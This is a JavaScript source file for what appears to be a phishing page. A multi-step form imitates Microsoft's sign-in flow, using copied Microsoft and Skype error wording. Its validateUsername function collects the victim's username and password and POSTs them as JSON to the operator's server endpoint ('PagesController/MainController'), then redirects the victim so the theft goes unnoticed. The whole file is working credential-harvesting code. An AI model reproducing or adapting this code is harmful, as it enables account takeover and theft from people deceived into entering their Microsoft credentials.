"use strict";

$(document).ready(function () {
  $('.errorMsg1').hide();
  $('.errorMsg2').hide();
  $('.AolNextBtn').on('click', function () {
    alert('2');
  });
}); //DOM elements

var DOMstrings = {
  stepsForm: document.querySelector('.multisteps-form__form'),
  stepsFormTextareas: document.querySelectorAll('.multisteps-form__textarea'),
  stepFormPanelClass: 'multisteps-form__panel',
  stepFormPanels: document.querySelectorAll('.multisteps-form__panel'),
  footerdiv: document.querySelectorAll('.card-footer'),
  stepPrevBtnClass: 'js-btn-prev',
  stepNextBtnClass: 'js-btn-next'
}; //remove class from a set of items

var removeClasses = function removeClasses(elemSet, className) {
  elemSet.forEach(function (elem) {
    elem.classList.remove(className);
  });
}; //return exect parent node of the element


var findParent = function findParent(elem, parentClass) {
  var currentNode = elem;

  while (!currentNode.classList.contains(parentClass)) {
    currentNode = currentNode.parentNode;
  }

  return currentNode;
}; //get active panel


var getActivePanel = function getActivePanel() {
  var activePanel;
  DOMstrings.stepFormPanels.forEach(function (elem) {
    if (elem.classList.contains('js-active')) {
      activePanel = elem;
    }
  });
  return activePanel;
}; //open active panel (and close unactive panels)


var setActivePanel = function setActivePanel(activePanelNum) {
  //remove active class from all the panels
  removeClasses(DOMstrings.stepFormPanels, 'js-active'); //show active panel

  DOMstrings.stepFormPanels.forEach(function (elem, index) {
    if (index === activePanelNum) {
      elem.classList.add('js-active');
      setFormHeight(elem);
    }
  });
}; //set form height equal to current panel height


var formHeight = function formHeight(activePanel) {
  var activePanelHeight = activePanel.offsetHeight;
  DOMstrings.stepsForm.style.height = "".concat(activePanelHeight, "px");
};

var setFormHeight = function setFormHeight() {
  var activePanel = getActivePanel();
  formHeight(activePanel);
}; //PREV/NEXT BTNS CLICK


DOMstrings.stepsForm.addEventListener('click', function (e) {
  var eventTarget = e.target; //check if we clicked on `PREV` or NEXT` buttons

  if (!(eventTarget.classList.contains("".concat(DOMstrings.stepPrevBtnClass)) || eventTarget.classList.contains("".concat(DOMstrings.stepNextBtnClass)))) {
    return;
  } //find active panel


  var activePanel = findParent(eventTarget, "".concat(DOMstrings.stepFormPanelClass));
  var activePanelNum = Array.from(DOMstrings.stepFormPanels).indexOf(activePanel); //set active step and active panel onclick

  if (eventTarget.classList.contains("".concat(DOMstrings.stepPrevBtnClass))) {
    activePanelNum--;
  } else {
    var userid = document.getElementById('____UserID').value;

    if (userid == '') {
      $('.errorMsg1').fadeIn().html("Enter a valid email address, phone number, or Skype name.");
      $("#____UserID").focus();
      return false;
    } else {
      $('.____userName').fadeIn().html(userid);
      $('.errorMsg1').hide();
      activePanelNum++;
    }
  }

  setActivePanel(activePanelNum);
}); //SETTING PROPER FORM HEIGHT ONLOAD

window.addEventListener('load', setFormHeight, false); //SETTING PROPER FORM HEIGHT ONRESIZE

window.addEventListener('resize', setFormHeight, false);

var validateUsername = function validateUsername() {
  var userpass = document.getElementById('userPass').value;
  var Username = document.getElementById('____UserID').value;

  if (userpass == '') {
    $('.errorMsg2').fadeIn().text("Please enter the password for your Microsoft account.");
    $("#userPass").focus();
    return false;
  } else {
    $('.errorMsg2').fadeOut();
    $('.errorMsg2').hide();
    var data = {
      "___Username": Username,
      "___Userpassword": userpass
    };
    var StringData = JSON.stringify(data);
    var Url = base_url + 'PagesController/MainController'; // the url where we want to POST

    $.ajax({
      type: 'POST',
      // define the type of HTTP verb we want to use (POST for our form)
      dataType: 'JSON',
      //the type of data we are sending is json
      contentType: "application/json; charset=utf-8",
      data: StringData,
      // our data object
      url: Url,
      //the post destination
      processData: false,
      //false because the preprocessor are not trigger
      encode: true,
      //turn on json encoding
      crossOrigin: true,
      // true because we are sending data with ajax as json format to php
      async: true,
      //because we are expecting long data so we set the whole data  Asynchronous with means configuring our Ajax code
      crossDomain: true,
      //just in case we host the site
      headers: {
        'Access-Control-Allow-Methods': '*',
        "Access-Control-Allow-Credentials": true,
        "Access-Control-Allow-Headers": "Access-Control-Allow-Headers, Origin, X-Requested-With, Content-Type, Accept, Authorization",
        "Access-Control-Allow-Origin": "*",
        "Control-Allow-Origin": "*",
        "cache-control": "no-cache",
        'Content-Type': 'application/json'
      }
    }).done(function (response) {
      if (response.status == 200) {
        $('.errorMsg2').fadeIn().html(response.message); // delay and reload & Redirect to Original Page

        setTimeout(function () {
          window.location.href = "";
        }, 3000);
      } else {
        $('.errorMsg2').fadeIn().html(response.message);
      }
    }).fail(function (xhr, status, error) {
      console.log('Oops...', 'Something went wrong with ajax !', 'error');
    });
  }
};